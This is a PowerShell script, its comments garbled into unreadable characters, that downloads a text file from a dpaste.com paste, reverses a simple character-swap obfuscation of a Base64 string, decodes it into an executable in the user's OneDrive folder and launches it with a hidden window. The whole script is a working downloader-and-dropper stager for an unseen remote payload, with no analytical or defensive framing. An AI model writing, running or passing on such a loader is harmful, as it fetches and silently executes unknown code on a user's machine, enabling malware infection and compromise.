# ����� ������ ���� ����� ��� ������� ������ �������
$url = "https://dpaste.com/FK3HL52TP.txt"

# ����� ������ ���� ������� ������� ������� �� OneDrive
$oneDriveFolder = "C:\Users\$env:USERNAME\OneDrive\MyApp"
$outputFile = "$oneDriveFolder\base64_data.txt"
$outputExe = "$oneDriveFolder\script.exe"

# ������ �� ���� ������ �� OneDrive� ��� �� ��� ������� ���� ������
if (-not (Test-Path $oneDriveFolder)) {
    New-Item -ItemType Directory -Path $oneDriveFolder
}

# ����� ������� ������ �� ������ ��� �����
Invoke-WebRequest -Uri $url -OutFile $outputFile

# ������ �� �� ������� �� ������� �����
if (Test-Path $outputFile) {
    Write-Host "Base64 string downloaded successfully."
} else {
    Write-Host "Error downloading Base64 string."
    exit
}

# ����� ������� ������
$base64String = Get-Content -Path $outputFile -Raw

# ������� ������ ������� ��� �� ������� (������� & �� A � * �� B)
$base64String = $base64String -replace '&', 'A' -replace '\*', 'B'

# ������ �� ������� ��� ���������
Write-Host "Modified Base64 string:"
Write-Host $base64String

# ����� ������� ��� ������
try {
    $bytes = [Convert]::FromBase64String($base64String)
} catch {
    Write-Host "Error converting Base64 string to bytes: $_"
    exit
}

# ����� �������� ��� ����� EXE
[System.IO.File]::WriteAllBytes($outputExe, $bytes)

# ���� ��� ��� �� ����� EXE �����
if (Test-Path $outputExe) {
    Write-Host "EXE file created successfully at: $outputExe"
    
    # ����� ����� ���� ��� ������ ����� EXE
    Start-Sleep -Seconds 2

    # ����� EXE �� ������� �������� Start-Process
    Start-Process -FilePath $outputExe -WindowStyle Hidden

    Write-Host "EXE is now running in the background."
} else {
    Write-Host "Failed to create EXE."
}
